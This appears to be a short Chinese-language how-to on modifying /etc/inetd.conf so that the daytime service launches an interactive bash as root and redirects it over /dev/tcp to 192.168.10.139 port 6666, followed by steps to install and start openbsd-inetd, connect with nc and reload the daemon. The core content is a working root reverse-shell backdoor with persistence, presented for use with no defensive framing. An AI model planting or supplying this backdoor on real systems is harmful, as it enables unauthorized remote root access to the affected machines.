inetd.conf文件


我们使用vi来修改 /etc/inetd.conf 文件

原文件：
#daytime stream tcp nowait root internal

修改为:
daytime stream tcp nowait root /bin/bash bash -i >&/dev/tcp/192.168.10.139/6666 0>&1

开启inetd：

下载
apt-get install openbsd-inetd
直接输入
inetd

之后使用nc连接即可

如果要强制重启inetd：

dawg:~# ps -ef | grep inetdroot
362 1 0 Jul22 ? 00:00:00 /usr/sbin/inetdroot
13769 13643 0 17:51 pts/1 00:00:00 grep inetd
dawg:~# kill -HUP 362



inetd是监视一些网络请求的守护进程
在这个文件中，你可以添加或删除一个服务，或是在一行前增加一个注释符（如’#’)
如果inetd进程在SRC控制下运行，则运行
refresh -s inetd
命令来让inetd进程重新读取inetd.conf文件中的配置信息.
